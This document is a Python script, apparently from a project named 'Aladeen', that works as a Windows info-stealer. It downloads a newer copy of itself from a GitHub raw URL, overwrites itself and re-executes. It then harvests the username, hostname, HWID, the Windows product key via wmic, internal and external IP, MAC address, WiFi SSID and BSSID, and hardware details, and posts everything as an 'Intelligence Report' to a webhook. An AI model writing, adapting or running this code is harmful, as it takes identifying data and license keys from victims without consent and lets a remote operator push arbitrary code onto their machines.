import os
import subprocess
import cpuinfo
import GPUtil
import sys
import psutil
import pywifi
import uuid
import pyautogui
import socket
import platform
import requests
from config import Config
from datetime import datetime
import asyncio
import aiohttp
import pygame
import pygame.camera
import shutil

import tempfile
# Load Config
cc = Config()
webhook = cc.get_webhook()
eb_color = cc.get_color()
SCRIPT_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/sysinf.py"
CURRENT_VERSION = "1.0.0"
UPDATE_URL = "https://raw.githubusercontent.com/adolfhustler/Aladeen/refs/heads/main/version.txt"

def check_for_updates():
    try:
        response = requests.get(UPDATE_URL)
        if response.status_code == 200:
            latest_version = response.text.strip()
            if latest_version > CURRENT_VERSION:
                print(f"[+] Update available: {latest_version}")
                download_latest_script()
                return True
            else:
                print("[+] You are using the latest version.")
                return False
        else:
            print(f"[-] Failed to check for updates. Status code: {response.status_code}")
            return False
    except Exception as e:
        print(f"[-] Error checking for updates: {e}")
        return False

def download_latest_script():
    try:
        response = requests.get(SCRIPT_URL)
        if response.status_code == 200:
            with tempfile.NamedTemporaryFile(delete=False, mode="wb", suffix=".py") as temp_file:
                temp_file.write(response.content)
                temp_file_path = temp_file.name

            shutil.move(temp_file_path, sys.argv[0])
            print(f"[+] Updated to the latest version. Restarting script...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
        else:
            print(f"[-] Failed to download the latest script. Status code: {response.status_code}")
    except Exception as e:
        print(f"[-] Error updating script: {e}")

check_for_updates()

# Function to get drive information
def get_drive_info():
    drive_info = []
    partitions = psutil.disk_partitions()

    for partition in partitions:
        drive = {"device": partition.device, "mountpoint": partition.mountpoint}
        try:
            usage = psutil.disk_usage(partition.mountpoint)
            drive.update({"total": usage.total, "used": usage.used})
            drive_info.append(drive)
        except OSError:
            continue
    return drive_info

# Format drive information
def format_drive_info(drives):
    return " - ".join(
        f"Drive: {d['device']} (Mount: {d['mountpoint']}) - Total: {d['total']} bytes - Used: {d['used']} bytes"
        for d in drives
    )

# System information
username = os.getenv("USERNAME", "Unknown")
hostname = os.environ.get("COMPUTERNAME", "Unknown")
hwid = subprocess.check_output('wmic csproduct get uuid').split(b'\n')[1].strip().decode()
lang = subprocess.check_output('wmic os get MUILanguages /format:list').decode().strip().split('\r\r\n')[0].split('=')[1]
system = subprocess.check_output('wmic os get Caption /format:list').decode().strip().split('\r\r\n')[0].split('=')[1]

# Product Key
try:
    output = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey', shell=True).decode().strip()
    product_key = output.split('\n', 1)[-1].strip()
except subprocess.CalledProcessError:
    product_key = "N/A"

# RAM & Battery
ram = f"{round(psutil.virtual_memory().total / (1024.0 **3))} GB"
battery = psutil.sensors_battery()
power = f"{battery.percent}%" if battery else "N/A"

# Screen & Webcams
screen = str(pyautogui.size())



pygame.camera.init()


cameras = pygame.camera.list_cameras()
webcams_count = len(cameras) if cameras else "N/A"
pygame.quit()




# IP Addresses
internal_ip = socket.gethostbyname(socket.gethostname())
external_ip = requests.get('https://api.ipify.org').text

# GPU Info
gpu_info = "\n".join(f"GPU: {gpu.name} - Driver: {gpu.driver} - Memory: {gpu.memoryUsed}/{gpu.memoryTotal}MB" for gpu in GPUtil.getGPUs())

# CPU Info
cpu_info_data = cpuinfo.get_cpu_info()
cpu_info = f"CPU: {cpu_info_data['brand_raw']} - Arch: {cpu_info_data['arch']} - Cores: {cpu_info_data['count']}"

# Drive Info
drives = get_drive_info()
drive_info_string = format_drive_info(drives)

# MAC Address & Processor
mac_address = ':'.join(['{:02X}'.format((uuid.getnode() >> elements) & 0xFF) for elements in range(0, 2*6, 2)][::-1])
processor_id = platform.processor()

# Get Device Model
try:
    device_model = subprocess.check_output("wmic csproduct get name", shell=True).decode().split("\n")[1].strip()
except subprocess.CalledProcessError:
    device_model = "Unknown"

# Get WiFi Info
ssid, bssid = "N/A", "N/A"
try:
    wifi = pywifi.PyWiFi()
    interfaces = wifi.interfaces()
    if interfaces:
        iface = interfaces[0]
        iface.scan()
        scan_results = iface.scan_results()
        if scan_results:
            ssid = scan_results[0].ssid
            bssid = scan_results[0].bssid
except Exception as e:
    print(f"WiFi Info Error: {e}")

# Timestamp
current_time_iso = datetime.now().isoformat()

def send_device_information():
        print("Sending webhook...")
        embed = {
            "title": "Intelligence Report",
            "description": "WIA",
            "color": eb_color,
            "fields": [
                {"name": "Hostname", "value": f"`{hostname}`", "inline": False},
                {"name": "Username", "value": f"`{username}`", "inline": False},
                {"name": "Device Model", "value": f"`{device_model}`", "inline": False},
                {"name": "HWID", "value": f"`{hwid}`", "inline": False},
                {"name": "SSID", "value": f"`{ssid}`", "inline": False},
                {"name": "BSSID", "value": f"`{bssid}`", "inline": False},
                {"name": "Language", "value": f"`{lang}`", "inline": False},
                {"name": "System", "value": f"`{system}`", "inline": False},
                {"name": "Product Key", "value": f"`{product_key}`", "inline": False},
                {"name": "RAM", "value": f"`{ram}`", "inline": False},
                {"name": "Power", "value": f"`{power}`", "inline": False},
                {"name": "Screen", "value": f"`{screen}`", "inline": False},
                {"name": "Webcams", "value": f"`{webcams_count}`", "inline": False},
                {"name": "Internal IP", "value": f"`{internal_ip}`", "inline": False},
                {"name": "External IP", "value": f"`{external_ip}`", "inline": False},
                {"name": "GPU", "value": f"`{gpu_info}`", "inline": False},
                {"name": "CPU", "value": f"`{cpu_info}`", "inline": False},
                {"name": "Drives", "value": f"`{drive_info_string}`", "inline": False},
                {"name": "MAC Address", "value": f"`{mac_address}`", "inline": False},
                {"name": "Processor ID", "value": f"`{processor_id}`", "inline": False},
            ],
            "footer": {
                "text": "Report Generated",
                "icon_url": "https://raw.githubusercontent.com/adolfhustler/Aladeen/main/Flag_of_Wadiya.gif",
            },
            "author": {
                "name": "System Info",
                "icon_url": "https://raw.githubusercontent.com/adolfhustler/Aladeen/main/Flag_of_Wadiya.gif",
            },
            "timestamp": current_time_iso,
        }

       
        requests.post(webhook, json={"embeds": [embed]})

